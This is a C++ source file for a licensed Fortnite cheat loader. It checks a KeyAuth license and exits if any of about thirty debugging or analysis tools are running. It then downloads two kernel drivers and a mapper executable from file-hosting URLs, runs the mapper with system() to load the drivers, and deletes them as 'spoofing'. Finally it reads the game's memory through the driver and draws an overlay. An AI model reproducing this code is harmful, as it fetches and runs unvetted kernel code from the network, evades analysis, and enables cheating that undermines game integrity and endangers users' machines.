#include <iostream>
#include <thread>
#include <algorithm>
#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <filesystem>
#include <windows.h>
#include <tlhelp32.h>
#include <urlmon.h>
#include "../keyauth/auth.hpp"
#include "../keyauth/auth_guard.hpp"
#include "../keyauth/skStr.h"
#include "../keyauth/storage.hpp"
#include "../keyauth/astryn_config.h"
#include "../main/main.h"
#include "../communication/memory.hpp"
#pragma comment(lib, "urlmon.lib")

using namespace std;
using namespace KeyAuth;

std::string name = AstrynConfig::appName();
std::string ownerid = AstrynConfig::ownerId();
std::string version = AstrynConfig::appVersion();
std::string url = AstrynConfig::apiUrl();
std::string path = AstrynConfig::appPath();

api KeyAuthApp(name, ownerid, version, url, path);

static void init_console_style()
{
	const HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(console, FOREGROUND_RED | FOREGROUND_INTENSITY);
}

static bool is_debugger_attached()
{
	if (IsDebuggerPresent())
		return true;

	BOOL remote_debugger = FALSE;
	if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote_debugger) && remote_debugger)
		return true;

	return false;
}

static bool is_cracking_tool_running()
{
	static const wchar_t* blocked_processes[] =
	{
		L"x64dbg.exe", L"x32dbg.exe", L"ollydbg.exe", L"ida.exe", L"ida64.exe",
		L"idag.exe", L"idag64.exe", L"idaq.exe", L"idaq64.exe",
		L"cheatengine-x86_64.exe", L"cheatengine.exe", L"cheat engine.exe",
		L"processhacker.exe", L"procexp.exe", L"procexp64.exe",
		L"dnspy.exe", L"dnspy-x86.exe", L"scylla.exe", L"scylla_x64.exe",
		L"petools.exe", L"reshacker.exe", L"httpdebugger.exe", L"fiddler.exe",
		L"wireshark.exe", L"charles.exe", L"reclass.net.exe", L"hxd.exe",
		L"immunitydebugger.exe", L"ghidra.exe", L"binaryninja.exe",
	};

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
		return false;

	PROCESSENTRY32W entry{};
	entry.dwSize = sizeof(entry);
	bool found = false;

	if (Process32FirstW(snapshot, &entry))
	{
		do
		{
			for (const wchar_t* blocked : blocked_processes)
			{
				if (_wcsicmp(entry.szExeFile, blocked) == 0)
				{
					found = true;
					break;
				}
			}
			if (found)
				break;
		} while (Process32NextW(snapshot, &entry));
	}

	CloseHandle(snapshot);
	return found;
}

static void exit_if_compromised()
{
	if (is_debugger_attached() || is_cracking_tool_running())
		ExitProcess(0);
}

static void start_anti_crack_monitor()
{
	std::thread([]() {
		while (true)
		{
			exit_if_compromised();
			Sleep(3000);
		}
	}).detach();
}

static std::string normalize_key(std::string key)
{
	key.erase(std::remove_if(key.begin(), key.end(), [](unsigned char c) {
		return std::isspace(c) != 0;
		}), key.end());

	std::transform(key.begin(), key.end(), key.begin(), [](unsigned char c) {
		return static_cast<char>(std::tolower(c));
		});
	return key;
}

static bool is_legacy_bypass_key(const std::string& key)
{
	const std::string normalized = normalize_key(key);
	return normalized == ".gg/easylol"
		|| normalized == "gg/easylol"
		|| normalized == "easylol"
		|| normalized.find(".gg/easylol") != std::string::npos;
}

static bool has_valid_subscription()
{
	if (KeyAuthApp.user_data.subscriptions.empty())
		return false;

	for (const auto& sub : KeyAuthApp.user_data.subscriptions)
	{
		if (!sub.expiry.empty() && api::expiry_remaining(sub.expiry) != "expired")
			return true;
	}

	return false;
}

static bool validate_license_session()
{
	KeyAuthApp.check(true);
	if (!KeyAuthApp.response.success)
		return false;

	if (KeyAuthApp.user_data.username.empty())
		return false;

	return has_valid_subscription();
}

static std::string get_license_file_path()
{
	char* appdata = nullptr;
	size_t len = 0;
	_dupenv_s(&appdata, &len, "LOCALAPPDATA");
	std::string base = (appdata && *appdata) ? appdata : ".";
	if (appdata)
		free(appdata);

	const std::filesystem::path dir = std::filesystem::path(base) / "SofMainFN";
	std::error_code ec;
	std::filesystem::create_directories(dir, ec);
	return (dir / "license.json").string();
}

static void clear_saved_license()
{
	std::error_code ec;
	std::filesystem::remove(get_license_file_path(), ec);
}

static void save_license_key(const std::string& key)
{
	WriteToJson(get_license_file_path(), "license", key, false, "", "");
}

static std::string load_saved_license_key()
{
	return ReadFromJson(get_license_file_path(), "license");
}

static void print_license_duration()
{
	for (const auto& sub : KeyAuthApp.user_data.subscriptions)
	{
		if (sub.expiry.empty())
			continue;

		const std::string remaining = api::expiry_remaining(sub.expiry);
		if (remaining == "expired")
			continue;

		std::cout << skCrypt("\nLicense: ") << sub.name << skCrypt(" - ") << remaining << skCrypt(" remaining");
	}
}

static bool try_license_key(const std::string& key)
{
	if (is_legacy_bypass_key(key))
		return false;

	KeyAuthApp.license(key, "");
	if (!KeyAuthApp.response.success)
		return false;

	return validate_license_session();
}

void sessionStatus()
{
	KeyAuthApp.check(true);
	if (!KeyAuthApp.response.success)
	{
		exit(0);
		return;
	}

	while (true)
	{
		Sleep(20000);
		KeyAuthApp.check();
		if (!KeyAuthApp.response.success || !has_valid_subscription())
			exit(0);
	}
}

static void finalize_authentication(const std::string& ownerid_copy, const std::string& key)
{
	save_license_key(key);

	std::thread auth_thread(checkAuthenticated, ownerid_copy);
	std::thread session_thread(sessionStatus);
	auth_thread.detach();
	session_thread.detach();

	print_license_duration();
	Sleep(2000);
}

static void print_banner()
{

}

static bool authenticate_user()
{
	print_banner();

	std::cout << skCrypt("\nConnecting..");
	KeyAuthApp.init();
	if (!KeyAuthApp.response.success)
	{
		std::cout << skCrypt("\nStatus: ") << KeyAuthApp.response.message;
		Sleep(1500);
		return false;
	}

	if (KeyAuthApp.checkblack())
	{
		std::cout << skCrypt("\nStatus: Blacklisted");
		Sleep(3000);
		return false;
	}

	const std::string ownerid_copy = ownerid;
	name.clear();
	ownerid.clear();
	version.clear();
	url.clear();
	path.clear();

	const std::string saved_key = load_saved_license_key();
	if (!saved_key.empty())
	{
		std::cout << skCrypt("\nChecking saved license..");
		if (try_license_key(saved_key))
		{
			std::cout << skCrypt("\nAuthenticated successfully!");
			finalize_authentication(ownerid_copy, saved_key);
			return true;
		}

		clear_saved_license();
		std::cout << skCrypt("\nSaved license is invalid or expired.");
	}

	std::string key;
	std::cout << skCrypt("\nEnter Key: ");
	std::cin >> key;

	if (is_legacy_bypass_key(key))
	{
		clear_saved_license();
		std::cout << skCrypt("\nStatus: Invalid license key");
		Sleep(3000);
		return false;
	}

	if (!try_license_key(key))
	{
		clear_saved_license();
		if (!KeyAuthApp.response.message.empty())
			std::cout << skCrypt("\nStatus: ") << KeyAuthApp.response.message;
		else
			std::cout << skCrypt("\nStatus: Invalid or expired Astryn license");
		Sleep(3000);
		return false;
	}

	std::cout << skCrypt("\nAuthenticated successfully!");
	finalize_authentication(ownerid_copy, key);
	return true;
}
void main()
{
	init_console_style();
	exit_if_compromised();
	start_anti_crack_monitor();

	if (!authenticate_user())
		exit(0);

	system("cls");
	print_banner();

	HRESULT hr1 = URLDownloadToFile(NULL, L"https://files.catbox.moe/8yvwo7.sys", L"crazy.sys", 0, NULL);
	if (hr1 != S_OK) {
		cout << "[!] Failed to download driver.\n";
		system("pause");

	}

	HRESULT hr2 = URLDownloadToFile(NULL, L"https://files.catbox.moe/sm8pfr.sys", L"tracabl0ck@.sys", 0, NULL);
	if (hr2 != S_OK) {
		cout << "[!] Failed to download driver.\n";
		system("pause");

	}

	cout << "[+] Downloading mapper ...\n";
	HRESULT hr3 = URLDownloadToFile(NULL, L"https://files.catbox.moe/nf6dr9.bin", L"crazyalso.exe", 0, NULL);
	if (hr3 != S_OK) {
		cout << "[!] Failed to download mapper.\n";
		system("pause");

	}

	cout << "[+] Both Files Downloaded Successfully\n";
	cout << "[+] Mapping driver...\n\n";

	string command = "crazyalso.exe crazy.sys";
	string command2 = "crazyalso.exe tracabl0ck@.sys";
	system(command.c_str());
	system(command2.c_str());

	cout << "\n[+] Woofing Completed Successfully!\n";

	cout << "[+] Cleaning up temporary files...\n";
	if (DeleteFile(L"crazyalso.exe") && DeleteFile(L"crazy.sys") && DeleteFile(L"tracabl0ck@.sys")) {
		cout << "[+] Spoofed Successfully\n";
	}
	else {
		cout << "[!] Warning: Could not delete one or both files.\n";
	}

	system("cls");


	printf("Waiting for game to run...");

	while (GameWnd == 0)
	{
		Sleep(1);
		fortnite::communcations::process_id = fortnite::communcations::get_process_id(L"FortniteClient-Win64-Shipping.exe");
		GameWnd = GetProcWindow(fortnite::communcations::process_id);
		Sleep(1);
	}

	system("cls");
	


	if (!input::init())
	{
		printf("The input was not initialized :(");
		Sleep(3000);
		exit(0);
	}

	if (!gui::init())
	{
		printf("The gui was not initialized :(");
		Sleep(3000);
		exit(0);
	}
	if (!fortnite::communcations::find_driver())
	{
		printf("The driver was not initialized :(");
		Sleep(3000);
		exit(0);
	}

	Base = fortnite::communcations::get_base();
	auto cr3 = fortnite::communcations::get_cr3();
	printf("Driver Base: 0x%llX\n", Base);
	printf("CR3 Ready: %s\n", cr3 ? "true" : "false");

	if (!fortnite::communcations::driver_handle)
	{
		printf("The driver couldn't get the base address");
		Sleep(3000);
		exit(0);
	}



	CreateOverlay();
	DirectXInit();
	RenderLoop();

}
